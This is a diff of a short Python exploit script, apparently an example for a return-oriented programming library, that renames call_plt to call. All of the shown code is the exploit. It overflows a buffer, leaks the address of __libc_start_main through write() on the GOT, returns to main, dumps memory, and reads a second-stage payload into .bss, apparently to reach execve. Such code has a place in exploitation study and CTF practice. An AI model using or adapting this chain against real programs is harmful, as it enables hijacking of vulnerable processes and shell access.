@@ -8,7 +8,7 @@ addr_stage = rop.section('.bss') + 0x400
 nr_execve = 11
 
 buf = rop.retfill(offset)
-buf += rop.call_plt('write', 1, rop.got('__libc_start_main'), 4)
+buf += rop.call('write', 1, rop.got('__libc_start_main'), 4)
 buf += rop.p(rop.addr('main'))
 
 p = Proc(rop.fpath)
@@ -19,8 +19,8 @@ print "[+] ref_addr = %x" % ref_addr
 
 buf = rop.fill(offset-0x10)
 buf += rop.p(rop.gadget('ret')) * 4
-buf += rop.call_plt('write', 1, ref_addr, 0x200000)
-buf += rop.call_plt('read', 0, addr_stage, 100)
+buf += rop.call('write', 1, ref_addr, 0x200000)
+buf += rop.call('read', 0, addr_stage, 100)
 buf += rop.p(rop.addr('main'))
 
 p.write(p32(len(buf)) + buf)
